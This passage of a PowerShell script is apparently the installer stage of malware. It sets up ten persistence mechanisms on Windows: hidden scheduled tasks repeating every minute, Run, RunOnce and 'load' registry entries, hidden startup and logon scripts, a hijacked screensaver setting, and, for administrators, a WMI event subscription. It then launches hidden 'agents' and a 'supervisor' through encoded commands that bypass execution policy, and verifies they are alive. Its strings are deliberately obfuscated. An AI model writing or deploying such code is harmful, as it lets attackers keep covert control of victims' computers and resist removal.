# STEP 7: PERSISTENCE (10 vectors — task 1min offset 20s)
# ============================================================
$installed = 0

# 7.1 Tasks x3 (offset 20s, repeat 1min)
$offsets = @(20, 40, 60)
$names   = @(((GetItem61 @(45,137,86,133,31,220,57,193) @(123,187,4,252)) + ${InstallId}), ((GetItem61 @(184,204,127,23,166,242,235,211) @(238,254,49,99,197,179,214)) + ${InstallId}), ((GetItem61 @(157,167,100,152,50,144,51,246) @(203,148,42,244,107,231,14)) + ${InstallId}))
for ($idx=0; $idx -lt 3; $idx++) {
    $taskName = $names[$idx]
    $offSec = $offsets[$idx]
    $tOK = IR -Max 3 -D 10 -A {
        try {
            $sched = New-Object -ComObject Schedule.Service
            $sched.Connect()
            $tf = $sched.GetFolder('\')
            $t = $sched.NewTask(0)
            $t.RegistrationInfo.Description = (GetItem61 @(156,167,32,157,225,141,172,127,139,194,136,193,22,176,241,248,244,27,166,215,131,208,36,132,217,130,215,32,139,220,247,168) @(202,149,76,232,187))
            $t.RegistrationInfo.Author = (GetItem61 @(234,113,200,33,248,164,95,196,68,150,17,171,128,35,240,80,199,37,217,191,5,211,96,148,42,204,240,19) @(190,38,164,75,155,201,102))
            $t.Settings.Enabled = $true
            $t.Settings.Hidden = $true
            $t.Settings.StartWhenAvailable = $true
            $t.Settings.DisallowStartIfOnBatteries = $false
            $t.Settings.StopIfGoingOnBatteries = $false
            $t.Settings.ExecutionTimeLimit = (GetItem61 @(138,245,150,83,64,95,16,226) @(223,179,199,41,13,25,93))
            $t.Settings.MultipleInstances = 2
            $tr1 = $t.Triggers.Create(9); $tr1.UserId = ($env + (GetItem61 @(49,54,149,91,231,155,130,152,42,106,242,77,230,152,253,190) @(126,90,195,15,181,205,200,221)) + $env + (GetItem61 @(219,187,18,204,148,245,202,219,134,17,169,128) @(148,215,68,152,198,163,128)))
            $tr2 = $t.Triggers.Create(1)
            $tr2.StartBoundary = (Get-Date).AddSeconds($offSec).ToString((GetItem61 @(26,143,7,56,26,132,90,67,43,132,90,102,37,145,57,68,44,147,27,121,29,131,27,119,28,160,86,48) @(127,215,107,13)))
            $tr2.Repetition.Interval = (GetItem61 @(0,56,152,206,119,4,67,244) @(85,126,201,182,35))
            $ac = $t.Actions.Create(0)
            $ac.Path = $supExe
            $ac.Arguments = $supArgs
            $t.Principal.UserId = ($env + (GetItem61 @(191,248,140,80,121,143,112,112,164,164,235,70,120,140,15,86) @(240,148,218,4,43,217,58,53)) + $env + (GetItem61 @(5,142,109,28,229,175,224,240,27,183,10,14) @(74,226,59,72,183,249,170,191)))
            $t.Principal.LogonType = 3
            $t.Principal.RunLevel = 0
            $tf.RegisterTaskDefinition($taskName, $t, 6, $null, $null, 3, $null) | Out-Null
            Start-Sleep -Milliseconds 500
            return [bool](Get-ScheduledTask -TaskName $taskName -EA 0)
        } catch { return $false }
    }
    if ($tOK) { $installed++ }
}

# 7.2 Registry x4
$runCmd = ("`"" + $supExe + (GetItem61 @(51,236,143,91) @(122,133,206,102,14,103,191,68)) + $supArgs)
foreach ($reg in @(
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name=((GetItem61 @(7,66,79,153,53,23,32,221) @(81,112,29,224)) + $InstallId)},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name=((GetItem61 @(30,67,200,109,98,114,46,22) @(72,112,158,26,56,51,19,43)) + $InstallId)},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'; Name=((GetItem61 @(134,154,63,27,16,145,148,64) @(208,169,125,109,114)) + $InstallId)},
    @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
)) {
    $rc = $reg
    $rOK = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
            Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
            return [bool]((Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name))
        } catch { return $false }
    }
    if ($rOK) { $installed++ }
}

# 7.3 Startup CMD
$sOK = IR -Max 3 -D 5 -A {
    try {
        $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) ("W" + $InstallId + (GetItem61 @(158,193,168,89,70,34,164,239) @(210,172,230,45,28,99,153)))
        [IO.File]::WriteAllText($cmd, ((GetItem61 @(229,194,192,131,188,12,140,226,244,219,135,38,240,212,230,147,185,12,242,252,242,170,156,34,253,236,215,159,132,34,245,236) @(180,133,150,233,221,75)) + $supExe + (GetItem61 @(124,25,28,89) @(53,112,93,100)) + $supArgs + (GetItem61 @(58,111,238,10,27,121,242,86) @(126,62,158,102))), [Text.Encoding]::ASCII)
        try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        return (Test-Path $cmd)
    } catch { return $false }
}
if ($sOK) { $installed++ }

# 7.4 LogonScript
$lOK = IR -Max 3 -D 5 -A {
    try {
        $cmdPath = ($env + (GetItem61 @(117,179,91,188,110,137,75,153,118,177,106,199) @(58,223,9,250)) + $InstallId + (GetItem61 @(196,104,9,91,84,20,253,181) @(136,5,71,47,14,85,192)))
        [IO.File]::WriteAllText($cmdPath, ((GetItem61 @(66,45,196,46,217,255,19,225,113,88,200,41,252,233,91,252,119,45,212,61,220,251,106,239,90,3,211,50,225,209,106,239) @(19,106,146,68,184,184,43,134)) + $supExe + (GetItem61 @(125,110,83,13) @(52,7,18,48)) + $supArgs + (GetItem61 @(133,111,118,206,52,74,105,241) @(193,62,6,162,81,13,5))), [Text.Encoding]::ASCII)
        Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
        return [bool]((Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript)
    } catch { return $false }
}
if ($lOK) { $installed++ }

# 7.5 Screensaver
$scrOK = IR -Max 3 -D 5 -A {
    try {
        $scr = ($env + (GetItem61 @(58,96,49,52,33,90,33,17,57,98,0,79) @(117,12,99,114)) + $InstallId + (GetItem61 @(174,194,133,163,129,203,246,244) @(226,172,203,201)))
        [IO.File]::WriteAllText($scr, ((GetItem61 @(100,13,249,51,185,246,189,82,40,157,3,181,245,212,69,48,203,30,158,200,225,118,11,198,16,177,240,243,108,35,238,48) @(53,74,175,89,216,177,133)) + $supExe + (GetItem61 @(183,187,58,146) @(254,210,123,175,231,23,201,89)) + $supArgs + (GetItem61 @(16,6,81,61,120,19,59,17) @(84,87,33,81,29))), [Text.Encoding]::ASCII)
        try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
        return [bool]((Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE')
    } catch { return $false }
}
if ($scrOK) { $installed++ }

# 7.6 WMI (admin only)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $wmiOK = IR -Max 2 -D 5 -A {
        try {
            $q = (GetItem61 @(17,13,124,174,149,14,210,17,116,105,140,160,9,240,14,109,126,176,133,61,196,116,81,95,128,244,9,244,38,80,100,143,147,12,165,47,92,125,185,183,2,174,2,13,75,180,254,46,206,28,103,70,129,169,10,251,18,13,70,182,148,30,240,11,116,110,186,176,22,223,6,101,121,166,145,8,206,23,127,127,186,159,17,242,30,101,120,169,165,53,210,116,100,125,214,173,1,207,6,119,127,211,130,60,214,117,89,90,129,173,22,229,28,12,104,143,164,54,198,3,95,25,169,179,2,196,22,13,112,180,149,30,197,28,111,66,187,246,25,240,39,80,112,179,146,106,165,16,88,114,173,247,1,203,116,83) @(68,61,42,227,199,91,156))
            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=("Wd" + $InstallId);EventNamespace=(GetItem61 @(120,26,44,131,48,190,99,29,116,162,101,202,86,16,40,200) @(27,119,21,245,84,248));Query=$q} -EA Stop
            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=((GetItem61 @(91,176,142,175) @(13,130,220,197)) + $InstallId);CommandLineTemplate=("`"" + $supExe + (GetItem61 @(140,33,8,217) @(197,72,73,228,84,95,61)) + $supArgs)} -EA Stop
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} -EA Stop | Out-Null
            return $true
        } catch { return $false }
    }
    if ($wmiOK) { $installed++ }
}
P ((GetItem61 @(220,203,110,60,208,52,163,84,233,220,87,49) @(138,166,56,86,180,115,154,45)) + $installed) Green

# ============================================================
# STEP 8: LAUNCH
# ============================================================
# Launch 3 agents
for ($i=0; $i -lt 3; $i++) {
    if ($useConhost) {
        Start-Process $conhost -ArgumentList @('--headless',('"'+$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',$watchdogEnc) -WindowStyle Hidden -EA 0
    } else {
        Start-Process $wscript -ArgumentList ('"'+$VbsFile+'"') -WindowStyle Hidden -EA 0
    }
    Start-Sleep -Milliseconds 900
}
P (GetItem61 @(138,30,221,19,102,245,49,234,31,116,138,0,252,72,126,175,3,173,78,80,157,38,162,70) @(199,103,159,123,60)) Green

# Launch supervisor
if ($useConhost) {
    Start-Process $conhost -ArgumentList @('--headless',('"'+$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner)))) -WindowStyle Hidden -EA 0
} else {
    Start-Process $wscript -ArgumentList ('"'+$supVbsFile+'"') -WindowStyle Hidden -EA 0
}
P (GetItem61 @(48,26,174,175,186,162,47,27,153,128,174,140,6,64,186,162,131,189,35,26,154,181,182,145) @(101,41,248,216,224,250)) Green

# ============================================================
# STEP 9: VERIFY
# ============================================================
Start-Sleep -Seconds 20
$alive = 0
if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }

$supAlive = $false
try {
    $supEncB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner))
    $supPrefix = $supEncB64.Substring(0, 40)
    Get-CimInstance Win32_Process -EA 0 | Where-Object {
        $_.CommandLine -and $_.CommandLine -match [regex]::Escape($supPrefix)
    } | ForEach-Object { $supAlive = $true }
} catch { }

P ""
P (GetItem61 @(39,98,105,211,172,203,71,15,9,190,204,166,39,98,105,211,172,203,71,15,9,190,204,166,39,98,105,211,172,203,71,15,9,190,204,166,39,98,105,211,172,203,71,15,9,190,204,166) @(119,54,89,234,252,159)) Cyan
P ((GetItem61 @(69,197,102,102,95,211,118,102,95,211,118,102,95,212,88,102) @(22,144,55,1)) + $InstallId) Yellow
P ((GetItem61 @(18,90,252,11,116,40,61,193,14,98,23,12,248,40,74,33) @(70,107,177,108,37)) + $osBuild)
P ((GetItem61 @(33,176,247,179,46,24,185,222,216,20,60,144,248,198,35,18) @(117,247,177,130,76)) + $(if($useConhost){'conhost --headless'}else{'VBS wscript'}))
P ((GetItem61 @(232,65,87,160,127,212,37,85,159,94,248,20,102,146,114,222) @(185,115,47,214,29)) + $($clones.Count) + "/7")
P ((GetItem61 @(133,139,26,40,169,186,142,4,13,136,149,187,55,0,164,179) @(212,220,126,68,203)) + $alive + "/3") $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
P ((GetItem61 @(199,132,90,20,200,239,70,81,243,239,66,21,241,221,99,4) @(146,183,12,99)) + $(if($supAlive){'RUNNING'}else{'DEAD'})) $(if($supAlive){'Green'}else{'Red'})
P ((GetItem61 @(137,97,189,162,187,75,210,177,188,117,170,175,150,72,132,175) @(223,12,235,200)) + $installed)
P (GetItem61 @(231,76,0,1,11,208,244,18,52,18,41,240,251,101,57,28,11,164,228,86,31,63,45,166,209,88,23,9,33,223,224,73,53,73,27,240,255,118,102,28,10,165,232,76,53,73,62,167,251,101,31,12,11,224,143,28) @(178,33,86,123,104,151))
P ((GetItem61 @(28,140,181,2,7,11,138,235,37,13,9,172,197,40,33,47) @(72,203,140,108,78)) + $LogFile)
P (GetItem61 @(73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137,73,44,46,137) @(25,120,30,176)) Cyan

if ($alive -ge 3 -and $supAlive) { P (GetItem61 @(25,214,13,214,248,225,7,234,104,205,255,225,28,141,116,192) @(73,188,57,253,177,167)) Green }
elseif ($alive -ge 1) { P (GetItem61 @(237,172,98,144,124,7,89,77,232,170,4,241,100,20,108,50) @(189,198,86,187,53,65,27,15)) Yellow }
else { P (GetItem61 @(170,88,23,122,179,119,121,19,169,103,91,23,168,115,30,108) @(250,50,35,81)) Red }

Log (GetItem61 @(189,177,202,142,164,173,163,206,163,182,184,220,143,215,207,219,164,161,202,142,189,180,199,138) @(237,229,250,183))
